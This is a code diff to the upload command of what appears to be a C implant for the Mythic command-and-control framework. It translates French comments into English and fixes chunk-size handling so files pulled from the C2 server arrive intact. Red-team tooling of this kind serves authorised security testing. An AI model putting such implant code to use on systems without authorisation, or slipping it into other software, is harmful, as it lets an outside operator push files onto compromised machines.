@@ -10,7 +10,7 @@
 
 #define UPLOAD_CHUNK_SIZE (512 * 1024)
 
-/* Extrait une valeur entière JSON pour la clé donnée (valeur non quotée) */
+/* Extract an integer JSON value for the given key (unquoted value) */
 static int extract_json_int(const char *json, const char *key, int defval) {
   char pat[64];
   snprintf(pat, sizeof(pat), "\"%s\"", key);
@@ -26,9 +26,9 @@ static int extract_json_int(const char *json, const char *key, int defval) {
   return atoi(vp);
 }
 
-/* Extrait la valeur d'une clé JSON dont le contenu est du base64
- * (pas de caractères spéciaux → recherche du premier '"' suffisant).
- * Retourne un buffer malloc'd à libérer par l'appelant, ou NULL. */
+/* Extract the value of a JSON key whose content is base64
+ * (no special characters -> searching for the first '"' is sufficient).
+ * Returns a malloc'd buffer to be freed by the caller, or NULL. */
 static char *extract_b64_value(const char *json, const char *key) {
   char pat[72];
   snprintf(pat, sizeof(pat), "\"%s\":\"", key);
@@ -80,20 +80,15 @@ void command_upload(char *task_id, char *params) {
   int success = 1;
 
   while (1) {
-    /* Construction de la requête de chunk */
+    /* chunk_size must be repeated every request: Mythic computes seek offset as
+     * (chunk_num-1)*chunk_size per request; omitting it triggers the 512000 default,
+     * causing overlapping / missing byte ranges for multi-chunk transfers. */
     char json_msg[1024];
-    if (chunk_num == 1) {
-      snprintf(json_msg, sizeof(json_msg),
-               "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
-               "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
-               "\"chunk_num\":1,\"full_path\":\"%s\"}}]}",
-               task_id, UPLOAD_CHUNK_SIZE, file_id, escaped_path);
-    } else {
-      snprintf(json_msg, sizeof(json_msg),
-               "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
-               "\"upload\":{\"chunk_num\":%d,\"file_id\":\"%s\"}}]}",
-               task_id, chunk_num, file_id);
-    }
+    snprintf(json_msg, sizeof(json_msg),
+             "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+             "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+             "\"chunk_num\":%d,\"full_path\":\"%s\"}}]}",
+             task_id, UPLOAD_CHUNK_SIZE, file_id, chunk_num, escaped_path);
 
     char *b64_resp = send_c2_message(json_msg);
     if (!b64_resp) {
@@ -118,7 +113,7 @@ void command_upload(char *task_id, char *params) {
       }
     }
 
-    /* Extraire et décoder chunk_data */
+    /* Extract and decode chunk_data */
     char *b64_chunk = extract_b64_value(json_resp, "chunk_data");
     free(json_resp);
 
